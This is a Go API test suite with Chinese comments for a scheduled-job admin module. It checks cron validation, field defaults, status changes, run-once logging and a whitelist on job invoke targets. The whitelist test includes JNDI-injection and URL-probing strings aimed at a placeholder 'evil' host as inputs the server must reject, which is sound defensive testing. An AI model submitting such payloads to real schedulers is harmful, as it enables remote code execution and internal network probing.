package apitest

import (
	"fmt"
	"net/url"
	"testing"
	"time"
)

func newJobPayload(suffix string) map[string]any {
	return map[string]any{
		"jobName":  testPrefix + "任务" + suffix,
		"jobGroup": "DEFAULT",
		// 只有注册表里有的名字才允许，这是唯一的白名单
		"invokeTarget": "ryTask.ryParams('" + suffix + "')",
		// Quartz 语法：秒 分 时 日 月 周，每天 3 点
		"cronExpression": "0 0 3 * * ?",
		"misfirePolicy":  "3",
		"concurrent":     "1",
		// 默认建成暂停：测试造的任务不应该真的开始跑
		"status": "1",
		"remark": "测试任务",
	}
}

func createJob(t *testing.T, body map[string]any) int64 {
	t.Helper()
	mustOK(t, doPost(t, "/monitor/job", body), "新增定时任务")

	name := fmt.Sprint(body["jobName"])
	list := pageRows(t, doGet(t, "/monitor/job/list?pageSize=100&jobName="+url.QueryEscape(name)), "查定时任务")
	item := findBy(list, "jobName", name)
	if item == nil {
		t.Fatalf("新增任务后按名称 %s 查不到", name)
	}
	id := idOf(t, item, "jobId")

	t.Cleanup(func() { _ = doDelete(t, "/monitor/job/"+idPath(id)) })
	return id
}

// TestJobCRUD 定时任务增删改查。
func TestJobCRUD(t *testing.T) {
	body := newJobPayload("crud")
	id := createJob(t, body)
	path := "/monitor/job/" + idPath(id)

	detail := dataObject(t, doGet(t, path), "查定时任务")
	assertField(t, detail, "jobName", body["jobName"], "新增后")
	assertField(t, detail, "invokeTarget", body["invokeTarget"], "新增后")
	assertField(t, detail, "cronExpression", "0 0 3 * * ?", "新增后")
	assertString(t, detail, "任务详情", "status", "concurrent", "misfirePolicy")

	// 【前端详情弹窗读的字段】Java 版是 getNextValidTime() 这个 getter，
	// 少了它前端「下次执行时间」一栏永远空白
	if _, ok := detail["nextValidTime"]; !ok {
		t.Errorf("任务详情应带 nextValidTime，实际字段=%v", topKeys(detail))
	}

	updated := payload(body)
	updated["jobId"] = id
	updated["jobName"] = testPrefix + "任务改名"
	updated["cronExpression"] = "0 30 4 * * ?"
	// 并发从「禁止」改成「允许」——0 是零值，用 Updates(struct) 会被跳过
	updated["concurrent"] = "0"
	mustOK(t, doPut(t, "/monitor/job", updated), "修改定时任务")

	detail = dataObject(t, doGet(t, path), "改后查任务")
	assertField(t, detail, "jobName", testPrefix+"任务改名", "改后")
	assertField(t, detail, "cronExpression", "0 30 4 * * ?", "改后")
	assertField(t, detail, "concurrent", "0", "改后（零值不能被跳过）")

	mustOK(t, doDelete(t, path), "删除定时任务")
	mustFail(t, doGet(t, path), "不存在", "删除后再查")
}

// TestJobCronValidation cron 表达式的校验，重点是 Quartz 和 robfig 的差异。
func TestJobCronValidation(t *testing.T) {
	cases := []struct {
		name   string
		cron   string
		wantIn string
	}{
		{"每天 3 点", "0 0 3 * * ?", ""},
		{"每 10 秒", "0/10 * * * * ?", ""},
		{"每周一（Quartz 编号）", "0 0 9 ? * 2", ""},
		{"带年份通配的 7 段", "0 0 3 * * ? *", ""},
		{"星期用名称", "0 0 9 ? * MON", ""},

		{"5 段（标准 cron，不是 Quartz）", "0 3 * * *", "6 或 7 段"},
		{"8 段", "0 0 3 * * ? * *", "6 或 7 段"},
		{"指定了具体年份", "0 0 3 * * ? 2027", "不支持指定年份"},
		{"月末 L", "0 0 3 L * ?", "不支持"},
		{"最近工作日 W", "0 0 3 15W * ?", "不支持"},
		{"第几个星期几 #", "0 0 3 ? * 6#3", "不支持"},
		{"星期超出 1-7", "0 0 3 ? * 9", "星期取值"},
		{"纯粹的乱码", "这不是 cron", "6 或 7 段"},
		{"字段值越界", "99 0 3 * * ?", "不正确"},
	}

	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := newJobPayload(fmt.Sprintf("c%d", i))
			body["cronExpression"] = tc.cron

			r := doPost(t, "/monitor/job", body)
			if tc.wantIn == "" {
				mustOK(t, r, tc.name)
				return
			}
			mustFail(t, r, tc.wantIn, tc.name)
		})
	}
}

// TestJobInvokeTargetWhitelist 调用目标只认注册表里的名字。
//
// 【这是这个模块唯一的安全边界】Java 版靠反射调任意 Spring bean，
// 为此堆了白名单 + 黑名单 + 禁 rmi/ldap/http 一整套补丁。
// Go 侧查不到名字就是查不到，没有"绕过去调到别的东西"这种可能。
func TestJobInvokeTargetWhitelist(t *testing.T) {
	cases := []struct {
		name   string
		target string
		wantIn string
	}{
		{"已注册-无参", "ryTask.ryNoParams", ""},
		{"已注册-有参", "ryTask.ryParams('hello')", ""},
		{"已注册-多参", "ryTask.ryMultipleParams('ry', true, 2000L, 316.50D, 100)", ""},

		{"没注册过的名字", "someTask.doSomething", "未注册"},
		{"Java 的内网探测写法", "java.net.URL('http://evil')", "未注册"},
		{"JNDI 注入写法", "javax.naming.InitialContext.lookup('ldap://evil/a')", "未注册"},
		{"随便一个类名", "org.springframework.SomeBean.run", "未注册"},
		{"括号不匹配", "ryTask.ryParams('a'", "括号不匹配"},
		// 这条的括号其实是配对的，真正的问题在引号 —— 报错要指到点子上，
		// 笼统地说"括号不匹配"会把人往错误的方向带
		{"引号没闭合", "ryTask.ryParams('a)", "引号没有闭合"},
	}

	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := newJobPayload(fmt.Sprintf("t%d", i))
			body["invokeTarget"] = tc.target

			r := doPost(t, "/monitor/job", body)
			if tc.wantIn == "" {
				mustOK(t, r, tc.name)
				return
			}
			mustFail(t, r, tc.wantIn, tc.name)
		})
	}
}

// TestJobValidation 字段校验。
func TestJobValidation(t *testing.T) {
	keep := func(p map[string]any) map[string]any { return p }

	cases := []struct {
		name   string
		mutate func(map[string]any) map[string]any
		wantIn string
	}{
		{"完整数据", keep, ""},
		{"少传 jobName", func(p map[string]any) map[string]any { return omit(p, "jobName") }, "JobName"},
		{"jobName 纯空格", func(p map[string]any) map[string]any { return with(p, "jobName", "   ") }, "JobName"},
		{"jobName 超过 64 字", func(p map[string]any) map[string]any { return with(p, "jobName", repeatText(65)) }, "JobName"},
		{"少传 invokeTarget", func(p map[string]any) map[string]any { return omit(p, "invokeTarget") }, "InvokeTarget"},
		{"少传 cronExpression", func(p map[string]any) map[string]any { return omit(p, "cronExpression") }, "CronExpression"},
		{"cronExpression 超过 255 字", func(p map[string]any) map[string]any {
			return with(p, "cronExpression", repeatText(256))
		}, "CronExpression"},
		{"jobGroup 超过 64 字", func(p map[string]any) map[string]any { return with(p, "jobGroup", repeatText(65)) }, "JobGroup"},

		// 这三个列都有 DEFAULT，不传应当由服务端补默认值，不该报错
		{"少传 status", func(p map[string]any) map[string]any { return omit(p, "status") }, ""},
		{"少传 concurrent", func(p map[string]any) map[string]any { return omit(p, "concurrent") }, ""},
		{"少传 misfirePolicy", func(p map[string]any) map[string]any { return omit(p, "misfirePolicy") }, ""},
		{"少传 jobGroup", func(p map[string]any) map[string]any { return omit(p, "jobGroup") }, ""},
		{"非法 concurrent", func(p map[string]any) map[string]any { return with(p, "concurrent", "x") }, "并发执行"},
		{"非法 misfirePolicy", func(p map[string]any) map[string]any { return with(p, "misfirePolicy", "x") }, "计划策略"},

		{"remark 超过 500 字", func(p map[string]any) map[string]any { return with(p, "remark", repeatText(501)) }, "Remark"},
		{"多传未知字段", func(p map[string]any) map[string]any { return with(p, "hello", "world") }, ""},
	}

	for i, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			body := tc.mutate(newJobPayload(fmt.Sprintf("v%d", i)))
			r := doPost(t, "/monitor/job", body)
			if tc.wantIn == "" {
				mustOK(t, r, tc.name)
				return
			}
			mustFail(t, r, tc.wantIn, tc.name)
		})
	}
}

// TestJobDefaults 缺省字段由服务端补齐。
//
// 补不上的话前端的状态开关拿到空串，会显示成未知状态。
func TestJobDefaults(t *testing.T) {
	body := omit(newJobPayload("defaults"), "status", "concurrent", "misfirePolicy", "jobGroup")
	id := createJob(t, body)

	detail := dataObject(t, doGet(t, "/monitor/job/"+idPath(id)), "查默认值")
	assertField(t, detail, "jobGroup", "DEFAULT", "默认任务组")
	assertField(t, detail, "status", "1", "新建任务默认应为暂停，不能直接开跑")
	assertField(t, detail, "concurrent", "1", "默认禁止并发")
	assertField(t, detail, "misfirePolicy", "0", "默认策略应对齐 Java 字段初始值")
}

// TestJobCreateIgnoresClientControlledFields uses the Vue form's actual
// status=0 payload and a forged ID. Creation must still be a new paused task;
// activation is guarded by monitor:job:changeStatus.
func TestJobCreateIgnoresClientControlledFields(t *testing.T) {
	body := newJobPayload("server-owned")
	body["status"] = "0"
	body["jobId"] = 1
	id := createJob(t, body)
	if id == 1 {
		t.Fatal("新增任务采用了客户端伪造的 jobId")
	}
	detail := dataObject(t, doGet(t, "/monitor/job/"+idPath(id)), "查服务端控制字段")
	assertField(t, detail, "status", "1", "新建任务必须暂停")
}

// TestJobChangeStatus 暂停 / 启用，只传两个字段。
func TestJobChangeStatus(t *testing.T) {
	id := createJob(t, newJobPayload("status"))

	mustOK(t, doPut(t, "/monitor/job/changeStatus", map[string]any{
		"jobId": id, "status": "0",
	}), "启用任务（只传两个字段）")

	detail := dataObject(t, doGet(t, "/monitor/job/"+idPath(id)), "查任务状态")
	assertField(t, detail, "status", "0", "启用后")

	mustOK(t, doPut(t, "/monitor/job/changeStatus", map[string]any{
		"jobId": id, "status": "1",
	}), "暂停任务")

	mustFail(t, doPut(t, "/monitor/job/changeStatus", map[string]any{
		"jobId": id, "status": "x",
	}), "任务状态只能是0或1", "非法任务状态")
}

func TestJobUpdateRejectsInvalidEnums(t *testing.T) {
	body := newJobPayload("invalid-enums")
	id := createJob(t, body)
	for field, value := range map[string]string{
		"status": "x", "concurrent": "x", "misfirePolicy": "x",
	} {
		candidate := payload(body)
		candidate["jobId"] = id
		candidate[field] = value
		mustFail(t, doPut(t, "/monitor/job", candidate), "只能", "修改任务非法 "+field)
	}
}

// TestJobRunOnceWritesLog 立即执行一次，必须真的跑起来并落一条调度日志。
//
// 【只断言接口返回 200 是不够的】任务名解析错、注册表查不到、
// 日志写不进去，接口一样返回成功 —— 用户点了"执行一次"什么都没发生，
// 而且没有任何提示。必须去日志表里确认它真的跑了。
func TestJobRunOnceWritesLog(t *testing.T) {
	body := newJobPayload("runonce")
	jobName := fmt.Sprint(body["jobName"])
	id := createJob(t, body)

	mustOK(t, doPut(t, "/monitor/job/run", map[string]any{
		"jobId": id, "jobGroup": "DEFAULT",
	}), "立即执行一次")

	record := waitForJobLog(t, jobName, 5*time.Second)
	assertField(t, record, "status", "0", "执行结果应为成功")
	assertField(t, record, "invokeTarget", body["invokeTarget"], "日志里的调用目标")
	if message, _ := record["jobMessage"].(string); message == "" {
		t.Error("调度日志应带 jobMessage（含任务名和耗时）")
	}
}

// TestJobRunOnceRejectsUnknown 任务不存在时要报错，不能假装成功。
func TestJobRunOnceRejectsUnknown(t *testing.T) {
	mustFail(t, doPut(t, "/monitor/job/run", map[string]any{
		"jobId": 99999999, "jobGroup": "DEFAULT",
	}), "任务不存在", "执行不存在的任务")
}

// TestJobLogList 调度日志的查询、详情、删除。
func TestJobLogList(t *testing.T) {
	body := newJobPayload("logs")
	jobName := fmt.Sprint(body["jobName"])
	id := createJob(t, body)

	mustOK(t, doPut(t, "/monitor/job/run", map[string]any{"jobId": id}), "触发一次")
	record := waitForJobLog(t, jobName, 5*time.Second)
	logID := idOf(t, record, "jobLogId")

	detail := dataObject(t, doGet(t, "/monitor/jobLog/"+idPath(logID)), "查调度日志详情")
	assertField(t, detail, "jobName", jobName, "日志详情")

	mustOK(t, doDelete(t, "/monitor/jobLog/"+idPath(logID)), "删除调度日志")
	mustFail(t, doGet(t, "/monitor/jobLog/"+idPath(logID)), "不存在", "删除后再查")
}

// waitForJobLog 轮询等待某个任务的调度日志出现。
//
// 执行是异步的（接口不等任务跑完就返回），所以必须轮询而不是 sleep 一个
// 固定时长 —— 固定时长在慢机器上会偶发失败，在快机器上白白浪费时间。
func waitForJobLog(t *testing.T, jobName string, timeout time.Duration) map[string]any {
	t.Helper()
	path := "/monitor/jobLog/list?pageNum=1&pageSize=20&jobName=" + url.QueryEscape(jobName)

	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		rows := pageRows(t, doGet(t, path), "查调度日志")
		if item := findBy(rows, "jobName", jobName); item != nil {
			return item
		}
		time.Sleep(100 * time.Millisecond)
	}

	t.Fatalf("等了 %s 也没等到任务 %s 的调度日志 —— 任务没有真正执行", timeout, jobName)
	return nil
}
